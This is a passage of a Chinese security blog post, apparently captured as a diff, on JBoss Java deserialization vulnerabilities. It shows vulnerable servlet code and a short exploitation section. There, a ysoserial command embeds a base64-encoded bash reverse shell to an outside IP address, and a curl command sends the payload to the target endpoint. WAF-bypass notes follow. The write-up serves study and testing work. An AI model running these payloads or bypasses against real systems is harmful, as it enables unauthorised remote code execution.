ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(sis);</span><br><span class="line">            MarshalledInvocation mi = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mi = (MarshalledInvocation)ois.readObject();<span class="comment">//漏洞点</span></span><br><span class="line">            &#125;</span><br><span class="line">..............................................                </span><br></pre></td></tr></table></figure>
+<p>InvokerServlet.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jboss.invocation.http.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.processRequest(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.processRequest(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> trace = log.isTraceEnabled();</span><br><span class="line">        <span class="keyword">if</span> (trace) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;processRequest, ContentLength: &quot;</span> + request.getContentLength());</span><br><span class="line">            log.trace(<span class="string">&quot;processRequest, ContentType: &quot;</span> + request.getContentType());</span><br><span class="line">        &#125;</span><br><span class="line">        Boolean returnValueAsAttribute = (Boolean)request.getAttribute(<span class="string">&quot;returnValueAsAttribute&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response.setContentType(RESPONSE_CONTENT_TYPE);</span><br><span class="line">            MarshalledInvocation mi = (MarshalledInvocation)request.getAttribute(<span class="string">&quot;MarshalledInvocation&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (mi == <span class="keyword">null</span>) &#123;</span><br><span class="line">                ServletInputStream sis = request.getInputStream();<span class="comment">//漏洞点</span></span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(sis);</span><br><span class="line">                mi = (MarshalledInvocation)ois.readObject();</span><br><span class="line">                ois.close();</span><br><span class="line">            &#125;</span><br><span class="line">..............................................                </span><br></pre></td></tr></table></figure>
+
+<h3 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h3><p><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNjAuMTM1LjIyLzIzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</code></p>
+<p><code>curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser</code></p>
+<h2 id="java反序列化的waf绕过"><a href="#java反序列化的waf绕过" class="headerlink" title="java反序列化的waf绕过"></a>java反序列化的waf绕过</h2><p>遇到了就总结一下，绕过思路都是抄的大佬的</p>
+<p>尝试了脏数据，但是waf还是拦截<br>尝试了http分块传输，被拦截了，大小写绕过也不行<br>尝试了延时分块传输，连接超时报错<code>java.net.SocketException: Connection reset by peer: socket write error</code></p>
+<p>最后找到了p神的一篇文章<code>https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</code></p>
+<p>也可以使用yakit,自带混淆，双字节，脏数据，关键是可以一键反连，链子也还算挺全的，怪不得那些红队大佬都喜欢用它代替bp<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ20241114-024028.png" alt="QQ20241114-024028"></p>
+<p>但是yakit是国产的，也不知道如果被有些人滥用会不会被封</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># java反序列化</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/06/java/package/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">weblogic 反序列化</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
